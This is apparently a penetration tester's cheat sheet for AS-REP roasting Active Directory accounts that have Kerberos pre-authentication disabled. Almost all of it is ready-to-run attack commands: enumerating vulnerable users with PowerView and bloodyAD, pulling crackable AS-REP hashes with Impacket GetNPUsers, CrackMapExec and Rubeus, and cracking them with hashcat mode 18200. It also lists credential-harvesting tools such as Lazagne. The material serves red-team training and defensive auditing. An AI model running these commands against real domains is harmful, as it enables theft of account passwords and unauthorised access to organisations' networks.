### Occurs when a user account has the privilege "Does not require Pre-Authentication" set.

### This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

## Requirements:

### Accounts with the attribute DONT_REQ_PREAUTH ( PowerView > Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose )

#### Impacket-GetNPUsers.py domain.com\john.doe -no-pass (Retrieves a TGT)

### You can also do:

#### 1) Gather domain accounts in a list

#### 2) python3 Impacket-GetNPUsers.py -dc-ip DC_IP DOMAIN/USER -outputfile /tmp/list.txt

# Enumeration (Need domain credentials)

## Windows

 - Get-DomainUser -PreauthNotRequired -verbose (Powerview)

## Linux 

 - bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName  

## Method: Impacket GetNPUsers

 - python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast (Try all the usernames in usernames.txt)

 - python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast (Use domain creds to extract targets and target them)

## Alternate Method: CrackMapExec

 -  crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --asrep

## Alternate Method: ASREPRoast powershell module https://github.com/HarmJ0y/ASREPRoast

 - Get-ASREPHash -Username VPN114user -verbose

### More tools:

#### 1) Snaffler

#### 2) Lazagne

#### 3) Seatbelt

# Asreproasting

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `.\Rubeus.exe asreproast /outfile:asrep.txt`                 | Used to perform the Asreproast attack and save the extracted tickets to a file. |
| `hashcat -m 18200 -a 0 asrep.txt passwords.txt --force`      | Uses `hashcat` to crack AS-REP hashes that were saved in a file. |

